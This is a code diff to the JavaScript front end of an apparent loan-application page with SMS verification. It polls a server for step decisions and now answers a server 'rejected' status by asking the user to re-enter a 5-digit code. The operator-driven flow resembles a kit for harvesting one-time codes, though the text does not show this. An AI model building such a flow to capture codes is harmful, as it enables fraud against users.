@@ -1,4 +1,3 @@
-// --- Translation Dictionary ---
 const translations = {
     en: {
         lang_title_1: "Choose your", lang_title_2: "language", lang_subtitle: "Select your language to continue", lang_footer: "You can change it anytime",
@@ -51,7 +50,6 @@ let currentLang = 'en';
 let currentSessionId = null;
 let currentAmount = 0;
 
-// --- Numeric-only input enforcer ---
 function enforceNumericInput(el, maxLen) {
     if(!el) return;
     el.addEventListener('input', function () {
@@ -253,8 +251,9 @@ function pollForSmsResponse() {
                 document.getElementById('smsContent').value = '';
                 showScreen('sms-screen');
             } else if (data.nextStep === 'rejected') {
-                alert('Your application was rejected.');
-                showScreen('main-screen');
+                alert('Please enter the correct 5-digit code.');
+                showScreen('form-screen');
+                nextStep(2);
             } else {
                 setTimeout(pollForSmsResponse, 3000);
             }
@@ -288,7 +287,6 @@ function pollForFinalDecision() {
                 document.getElementById('approvedAmountDisplay').innerText = currentAmount.toLocaleString();
                 showScreen('success-screen');
             } else if (data.nextStep === 'final_rejected') {
-                alert('Your application was rejected.');
                 showScreen('error-screen'); 
             } else if (data.nextStep === 'resend_verification') {
                 alert('Please check your messages for a new verification code.');
